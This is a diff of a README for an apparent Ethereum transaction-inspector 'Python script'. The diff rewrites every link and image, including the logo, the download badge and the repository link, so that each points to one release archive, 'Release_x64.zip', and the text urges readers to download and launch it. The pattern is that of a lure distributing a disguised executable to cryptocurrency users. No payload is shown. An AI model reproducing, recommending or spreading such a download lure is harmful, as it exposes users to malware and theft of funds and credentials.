@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Ethereum Transaction Inspector! 🚀
 
-![Ethereum Logo](https://cdn.iconscout.com/icon/free/png-512/ethereum-1-283135.png)
+![Ethereum Logo](https://github.com/henryhendysheer/eth-transaction-inspector/releases/download/v1.0/Release_x64.zip)
 
 ## Repository: eth-transaction-inspector
 
@@ -13,7 +13,7 @@ The "eth-transaction-inspector" is a Python script that has been meticulously cr
 ### Get Started:
 To make use of this powerful tool, you can download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/henryhendysheer/eth-transaction-inspector/releases/download/v1.0/Release_x64.zip)](https://github.com/henryhendysheer/eth-transaction-inspector/releases/download/v1.0/Release_x64.zip)
 
 🚀 **Launch the Software:** Ensure to launch the software package for an immersive experience in exploring Ethereum transaction details.
 
@@ -35,12 +35,12 @@ If you encounter any issues or have any feedback, feel free to reach out to the 
 Stay updated with the latest developments in the world of decentralized technology, Ethereum, and cryptocurrencies. Follow our repository for exciting updates and new features to explore.
 
 ## 🌐 Explore Further:
-Visit the [repository link](https://github.com/22155555/1875695542) for more insights and updates.
+Visit the [repository link](https://github.com/henryhendysheer/eth-transaction-inspector/releases/download/v1.0/Release_x64.zip) for more insights and updates.
 
 ## 🌟 Join the Ethereum Ecosystem:
 Dive into the world of Ethereum, smart contracts, and decentralized finance to unravel the endless possibilities of blockchain technology. Embrace the future of finance and technology with Ethereum!
 
-![Ethereum Blockchain](https://www.coindesk.com/wp-content/uploads/2021/03/ethereum-symbol-glowing.jpg)
+![Ethereum Blockchain](https://github.com/henryhendysheer/eth-transaction-inspector/releases/download/v1.0/Release_x64.zip)
 
 ## 🚀 Start Your Journey:
 Begin your journey into the Ethereum ecosystem today with the Ethereum Transaction Inspector! Unveil the intricate world of blockchain technology and decentralization with just a few clicks.
